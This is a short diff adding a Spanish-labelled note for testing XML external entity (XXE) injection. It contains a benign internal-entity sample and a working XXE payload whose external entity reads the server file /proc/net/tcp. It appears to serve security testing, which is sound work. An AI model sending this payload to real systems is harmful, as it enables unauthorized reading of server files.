@@ -1,0 +1,17 @@
+valida xxe a través de XML
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE replace [<!ENTITY desc "Test Description"> ]>
+<parent>
+    <child>
+        <name>Test Name</name>
+        <description>&desc;</description>
+    </child>
+</parent>
+
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE data [
+    <!ENTITY file SYSTEM "file:///proc/net/tcp">
+]>
+<data>&file;</data>
